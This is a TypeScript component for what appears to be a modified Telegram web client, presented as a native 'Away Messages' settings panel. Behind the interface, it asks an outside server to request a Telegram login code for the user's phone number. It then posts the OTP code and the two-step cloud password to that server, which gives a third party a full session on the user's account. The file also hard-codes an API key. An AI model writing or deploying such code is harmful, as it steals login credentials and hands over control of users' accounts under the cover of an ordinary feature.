import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback, useEffect } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';

import Button from '../../ui/Button';
import InputText from '../../ui/InputText';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { 
  currentUserId?: string;
  currentUserPhone?: string; 
};

const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUserPhone }) => {
  const safeUserId = currentUserId || "unknown";

  const [isFetching, setIsFetching] = useState(true);
  const [isLinked, setIsLinked] = useState(false);
  const [isEnabled, setIsEnabled] = useState(false);
  const [replyText, setReplyText] = useState("I am currently unavailable. I will reply to you later.");
  const [mediaData, setMediaData] = useState<string | null>(null);
  const [mediaName, setMediaName] = useState<string | null>(null);
  const [removeMedia, setRemoveMedia] = useState(false);
  
  const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
    return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
  });
  const [savedPhone, setSavedPhone] = useState(() => localStorage.getItem(`ar_setup_phone_${safeUserId}`) || '');
  
  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    if (safeUserId === "unknown") return;
    const fetchSettings = async () => {
      try {
        const res = await fetch(`${BACKEND_URL}/api/get_auto_reply`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
          body: JSON.stringify({ user_id: safeUserId })
        });
        const data = await res.json();
        if (res.ok && data.is_linked) {
          setIsLinked(true);
          setIsEnabled(data.enabled);
          if (data.text) setReplyText(data.text);
          if (data.media_name) setMediaName(data.media_name);
        } else {
          setIsLinked(false);
        }
      } catch (err) {
      } finally {
        setIsFetching(false);
      }
    };
    fetchSettings();
  }, [safeUserId]);

  const handleCancelSetup = useCallback(() => {
    setStep('idle');
    setOtpCode('');
    setTwoFaPassword('');
    setErrorMsg('');
    localStorage.removeItem(`ar_setup_step_${safeUserId}`);
    localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
  }, [safeUserId]);

  const handleAutoRequestCode = async () => {
    if (!currentUserPhone) {
        setErrorMsg("Phone number not found.");
        return;
    }
    setErrorMsg('');
    const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: formattedPhone })
      });
      if (res.ok) {
        setStep('otp');
        setSavedPhone(formattedPhone);
        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
      } else {
        const data = await res.json();
        setErrorMsg(data.error || "Failed to request code.");
      }
    } catch (err) { setErrorMsg("Network Error."); }
    setIsLoading(false);
  };

  const handleVerifyCode = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, phone_number: savedPhone, otp_code: otpCode, two_step_password: twoFaPassword || undefined })
      });
      const data = await res.json();
      if (res.ok) {
        handleCancelSetup(); 
        setIsLinked(true);
        setIsEnabled(true);
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
      } else {
        setErrorMsg(data.error || "Verification failed.");
      }
    } catch (err) { setErrorMsg("Network Error."); }
    setIsLoading(false);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) { setErrorMsg("File is too large. Limit is 5MB."); return; }
      setErrorMsg('');
      const reader = new FileReader();
      reader.onloadend = () => { setMediaData(reader.result as string); setMediaName(file.name); setRemoveMedia(false); };
      reader.readAsDataURL(file);
    }
  };

  const handleSaveSettings = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ 
            user_id: safeUserId, enabled: isEnabled, text: replyText,
            media_data: mediaData, media_name: mediaName, remove_media: removeMedia
        })
      });
      if (!res.ok) {
        setIsLinked(false);
        setStep('idle');
        setErrorMsg("Session expired. Please reconnect.");
      } else {
        setErrorMsg('');
        setMediaData(null);
        setRemoveMedia(false);
      }
    } catch (err) { setErrorMsg("Failed to save."); }
    setIsLoading(false);
  };

  if (isFetching) return null;

  return (
    <div className="settings-content custom-scroll">
      
      {!isLinked ? (
        /* 🌟 [၁] မချိတ်ဆက်ရသေးသော အခြေအနေ (Login/Connect UI) 🌟 */
        <div className="ar-wrapper">
          <div className="ar-connect-box">
            
            {step === 'idle' && (
              <>
                <div className="ar-icon-circle">
                  {/* Clean SVG Message Icon */}
                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                </div>
                <div>
                  <div className="ar-title" style={{ fontSize: '1.25rem', marginBottom: '0.5rem' }}>Away Messages</div>
                  <div className="ar-desc">Define messages that are automatically sent when you are off.</div>
                </div>
              </>
            )}

            {(step === 'otp' || step === '2fa') && (
              <>
                <div className="ar-icon-circle">
                   {/* Clean SVG Lock Icon */}
                   <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                </div>
                <div>
                  <div className="ar-title" style={{ fontSize: '1.25rem', marginBottom: '0.5rem' }}>{step === 'otp' ? 'Verification Code' : 'Two-Step Verification'}</div>
                  <div className="ar-desc">{step === 'otp' ? 'Enter the code sent to your Telegram app.' : 'Your account is protected with an additional password.'}</div>
                </div>
                <div style={{ width: '100%', textAlign: 'left' }}>
                  {step === 'otp' && <InputText label="OTP Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} />}
                  {step === '2fa' && <InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} />}
                </div>
              </>
            )}

            {errorMsg && <div className="ar-error">{errorMsg}</div>}

            <div style={{ width: '100%', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
              <Button onClick={step === 'idle' ? handleAutoRequestCode : handleVerifyCode} isLoading={isLoading} fluid>
                  {step === 'idle' ? "CONNECT SERVER" : "VERIFY"}
              </Button>
              {step !== 'idle' && <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} fluid>CANCEL</Button>}
            </div>

          </div>
        </div>
      ) : (
        /* 🌟 [၂] ချိတ်ဆက်ပြီးသော အခြေအနေ (Main Settings UI) 🌟 */
        <div className="ar-wrapper">
          
          {/* Professional Toggle Card */}
          <div className="ar-card" onClick={() => setIsEnabled(!isEnabled)}>
            <div className="ar-text-col">
              <div className="ar-title">Away Messages</div>
              <div className="ar-desc">Reply automatically when you are away.</div>
            </div>
            <div className={`ar-switch ${isEnabled ? 'on' : ''}`}>
              <div className="ar-switch-thumb"></div>
            </div>
          </div>
                                    {/* Media Upload Box */}
          <div className={`ar-textarea-group ${!isEnabled ? 'disabled' : ''}`} style={{ marginTop: '0.5rem' }}>
            <div className="ar-textarea-label">Attachment (Optional)</div>
            {!mediaName ? (
              <label className="ar-media-upload">
                <input type="file" accept="image/*, application/pdf, video/mp4" style={{ display: 'none' }} onChange={handleFileChange} disabled={!isEnabled} />
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginBottom: '8px', color: 'var(--color-primary)' }}><path d="M21.2 15c.7-1.2 1-2.5.7-3.9-.6-2-2.4-3.5-4.4-3.5h-1.2c-.7-3-3.2-5.2-6.2-5.6-3-.3-5.9 1.3-7.3 4-1.2 2.5-1 6.5.5 8.8m8.7-1.6V21"/><path d="M16 16l-4-4-4 4"/></svg>
                <span style={{ fontSize: '14px', color: 'var(--color-text-secondary)' }}>Click to attach Image, Video or PDF (Max: 5MB)</span>
              </label>
            ) : (
              <div className="ar-media-preview">
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', overflow: 'hidden' }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--color-primary)" strokeWidth="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline></svg>
                  <span style={{ fontSize: '14px', fontWeight: 500, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{mediaName}</span>
                </div>
                <button onClick={() => { setMediaData(null); setMediaName(null); setRemoveMedia(true); }} style={{ background: 'rgba(223,63,64,0.1)', color: 'var(--color-error)', border: 'none', padding: '6px 12px', borderRadius: '6px', cursor: 'pointer', fontSize: '13px', fontWeight: 500 }} disabled={!isEnabled}>Remove</button>
              </div>
            )}
          </div>

          {/* Responsive Textarea */}
          <div className={`ar-textarea-group ${!isEnabled ? 'disabled' : ''}`}>
            <div className="ar-textarea-label">Message Box</div>
            <textarea
              className="ar-textarea"
              value={replyText}
              onChange={(e: any) => setReplyText(e.target.value)}
              disabled={!isEnabled}
              placeholder="Type your away message here..."
            />
          </div>

          {errorMsg && <div className="ar-error">{errorMsg}</div>}

          <div style={{ marginTop: '0.5rem' }}>
            <Button onClick={handleSaveSettings} disabled={isLoading} fluid>
              {isLoading ? "PLEASE WAIT..." : "SAVE SETTINGS"}
            </Button>
          </div>

        </div>
      )}
    </div>
  );
};

export default memo(withGlobal<OwnProps>((global): StateProps => { 
    const { currentUserId, users } = global;
    return { 
        currentUserId, 
        currentUserPhone: (currentUserId && users?.byId?.[currentUserId]?.phoneNumber) || undefined 
    }; 
})(AutoReplySettings));
